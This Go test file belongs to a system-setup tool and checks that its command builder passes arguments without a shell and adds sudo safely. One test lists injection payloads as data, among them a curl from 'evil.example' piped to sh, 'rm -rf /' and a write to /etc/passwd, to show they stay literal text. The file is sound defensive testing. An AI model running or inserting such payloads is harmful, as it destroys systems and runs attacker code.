package system

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/fynxlabs/rwr/internal/types"
)

func TestCommandExists_ValidCommand(t *testing.T) {
	// Test with a command that should exist on most systems
	var testCommand string
	switch runtime.GOOS {
	case "windows":
		testCommand = "cmd"
	default:
		testCommand = "sh"
	}

	result := CommandExists(testCommand)

	if !result {
		t.Errorf("Expected CommandExists('%s') to be true, got false", testCommand)
	}
}

func TestCommandExists_InvalidCommand(t *testing.T) {
	// Test with a command that definitely doesn't exist
	invalidCommand := "definitely-not-a-real-command-12345"

	result := CommandExists(invalidCommand)

	if result {
		t.Errorf("Expected CommandExists('%s') to be false, got true", invalidCommand)
	}
}

func TestCommandExists_EmptyCommand(t *testing.T) {
	result := CommandExists("")

	if result {
		t.Error("Expected CommandExists('') to be false, got true")
	}
}

func TestGetBinPath_ValidCommand(t *testing.T) {
	// Test with a command that should exist
	var testCommand string
	switch runtime.GOOS {
	case "windows":
		testCommand = "cmd"
	default:
		testCommand = "sh"
	}

	path, err := GetBinPath(testCommand)

	if err != nil {
		t.Errorf("Expected no error for GetBinPath('%s'), got: %v", testCommand, err)
	}

	if path == "" {
		t.Errorf("Expected non-empty path for GetBinPath('%s'), got empty string", testCommand)
	}

	// Verify the path is clean (no redundant separators)
	if filepath.Clean(path) != path {
		t.Errorf("Expected clean path, got potentially unclean path: %s", path)
	}
}

func TestGetBinPath_InvalidCommand(t *testing.T) {
	invalidCommand := "definitely-not-a-real-command-12345"

	path, err := GetBinPath(invalidCommand)

	if err == nil {
		t.Errorf("Expected error for GetBinPath('%s'), got nil", invalidCommand)
	}

	if path != "" {
		t.Errorf("Expected empty path for invalid command, got: %s", path)
	}
}

func TestGetBinPath_EmptyCommand(t *testing.T) {
	path, err := GetBinPath("")

	if err == nil {
		t.Error("Expected error for GetBinPath(''), got nil")
	}

	if path != "" {
		t.Errorf("Expected empty path for empty command, got: %s", path)
	}
}

// argvOf returns the argument vector buildCommand produced, which is what the
// kernel actually receives. Under the previous implementation every assertion
// below would instead see a three-element `sh -c "<joined string>"`.
func argvOf(t *testing.T, cmd types.Command) []string {
	t.Helper()
	return buildCommand(cmd).Args
}

func TestBuildCommand_NoShellIsInterposed(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("sudo/sh semantics are POSIX-only")
	}

	argv := argvOf(t, types.Command{Exec: "pacman", Args: []string{"-S", "vim"}})

	for _, a := range argv {
		if a == "sh" || a == "-c" {
			t.Fatalf("a shell was interposed: %v", argv)
		}
	}
	if want := []string{"pacman", "-S", "vim"}; !equalArgs(argv, want) {
		t.Errorf("argv = %#v, want %#v", argv, want)
	}
}

// A blueprint is data from a git repo. Shell metacharacters in a package name
// must reach the package manager as literal text, never as syntax — especially
// since package operations run elevated.
func TestBuildCommand_ShellMetacharactersAreNotInterpreted(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("sudo/sh semantics are POSIX-only")
	}

	payloads := []string{
		"vim; touch /tmp/pwned",
		"vim && curl evil.example/x.sh | sh",
		"$(touch /tmp/pwned)",
		"`touch /tmp/pwned`",
		"vim\nrm -rf /",
		"vim | tee /etc/passwd",
	}

	for _, payload := range payloads {
		t.Run(payload, func(t *testing.T) {
			argv := argvOf(t, types.Command{
				Exec:     "pacman",
				Args:     []string{"-S", payload},
				Elevated: true,
			})

			want := []string{"sudo", "--", "pacman", "-S", payload}
			if !equalArgs(argv, want) {
				t.Fatalf("argv = %#v, want %#v", argv, want)
			}
			if got := argv[len(argv)-1]; got != payload {
				t.Errorf("payload was split or rewritten: got %q, want %q", got, payload)
			}
		})
	}
}

// The old implementation joined Args on spaces and let sh re-split them, so any
// value containing a space silently became multiple arguments.
func TestBuildCommand_ArgumentsWithSpacesStayIntact(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("sudo/sh semantics are POSIX-only")
	}

	comment := "Levi Smith (personal laptop)"
	argv := argvOf(t, types.Command{
		Exec: "ssh-keygen",
		Args: []string{"-C", comment, "-N", ""},
	})

	want := []string{"ssh-keygen", "-C", comment, "-N", ""}
	if !equalArgs(argv, want) {
		t.Fatalf("argv = %#v, want %#v", argv, want)
	}
}

// A crypt hash such as $6$rounds=... was expanded by the shell, silently
// corrupting the password being set.
func TestBuildCommand_PasswordHashIsNotExpanded(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("sudo/sh semantics are POSIX-only")
	}

	hash := "$6$rounds=656000$abcdef$ghijkl.mnop"
	argv := argvOf(t, types.Command{
		Exec:     "useradd",
		Args:     []string{"--password", hash, "levi"},
		Elevated: true,
	})

	if got := argv[len(argv)-2]; got != hash {
		t.Errorf("password hash mangled: got %q, want %q", got, hash)
	}
}

func TestBuildCommand_Elevation(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("sudo/sh semantics are POSIX-only")
	}

	tests := []struct {
		name string
		cmd  types.Command
		want []string
	}{
		{
			name: "not elevated runs directly",
			cmd:  types.Command{Exec: "brew", Args: []string{"install", "jq"}},
			want: []string{"brew", "install", "jq"},
		},
		{
			name: "elevated prefixes sudo with -- terminator",
			cmd:  types.Command{Exec: "apt", Args: []string{"install", "jq"}, Elevated: true},
			want: []string{"sudo", "--", "apt", "install", "jq"},
		},
		{
			name: "as-user uses sudo -u",
			cmd:  types.Command{Exec: "paru", Args: []string{"-S", "jq"}, AsUser: "levi"},
			want: []string{"sudo", "-u", "levi", "--", "paru", "-S", "jq"},
		},
		{
			name: "elevated wins over as-user",
			cmd:  types.Command{Exec: "apt", Args: []string{"update"}, Elevated: true, AsUser: "levi"},
			want: []string{"sudo", "--", "apt", "update"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := argvOf(t, tt.cmd); !equalArgs(got, tt.want) {
				t.Errorf("argv = %#v, want %#v", got, tt.want)
			}
		})
	}
}

// Providers that genuinely want a shell ask for one explicitly, and that still
// works — the shell is declared in the provider definition rather than imposed on
// every command. Mirrors the AUR helper bootstrap steps in paru/yay/aura/etc.
func TestBuildCommand_ExplicitShellStillWorks(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("sudo/sh semantics are POSIX-only")
	}

	script := "cd /tmp/paru && makepkg -si --noconfirm"
	argv := argvOf(t, types.Command{Exec: "sh", Args: []string{"-c", script}})

	if want := []string{"sh", "-c", script}; !equalArgs(argv, want) {
		t.Fatalf("argv = %#v, want %#v", argv, want)
	}
}

// Non-elevated commands used to be handed to `sh -c`, which does not exist on
// Windows, so essentially all non-elevated Windows execution failed.
func TestBuildCommand_NeverUsesShOnWindows(t *testing.T) {
	argv := argvOf(t, types.Command{Exec: "winget", Args: []string{"install", "git"}})

	for _, a := range argv {
		if a == "sh" || a == "-c" {
			t.Fatalf("shell interposed on %s: %v", runtime.GOOS, argv)
		}
	}
}

// The log file used to be closed inside setOutputStreams, before the command
// ever ran, so everything a script wrote went to a dead descriptor.
func TestRunCommand_LogFileReceivesOutput(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("uses /bin/echo")
	}

	logPath := filepath.Join(t.TempDir(), "script.log")
	const marker = "rwr-log-marker"

	if err := RunCommand(types.Command{
		Exec:    "/bin/echo",
		Args:    []string{marker},
		LogName: logPath,
	}, false); err != nil {
		t.Fatalf("RunCommand: %v", err)
	}

	got, err := os.ReadFile(logPath)
	if err != nil {
		t.Fatalf("reading log file: %v", err)
	}
	if !strings.Contains(string(got), marker) {
		t.Errorf("log file = %q, want it to contain %q", got, marker)
	}
}

// Building the right argv is not enough; it has to execute that way too.
func TestRunCommand_ExecutesArgumentsVerbatim(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("uses /bin/echo")
	}

	logPath := filepath.Join(t.TempDir(), "out.log")
	const arg = "one arg with spaces; not two"

	if err := RunCommand(types.Command{
		Exec:    "/bin/echo",
		Args:    []string{arg},
		LogName: logPath,
	}, false); err != nil {
		t.Fatalf("RunCommand: %v", err)
	}

	got, err := os.ReadFile(logPath)
	if err != nil {
		t.Fatalf("reading log: %v", err)
	}
	if strings.TrimSpace(string(got)) != arg {
		t.Errorf("echoed %q, want %q", strings.TrimSpace(string(got)), arg)
	}
}

func equalArgs(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

// Benchmark tests.
func BenchmarkCommandExists(b *testing.B) {
	command := "sh"
	if runtime.GOOS == "windows" {
		command = "cmd"
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		CommandExists(command)
	}
}

func BenchmarkGetBinPath(b *testing.B) {
	command := "sh"
	if runtime.GOOS == "windows" {
		command = "cmd"
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = GetBinPath(command)
	}
}
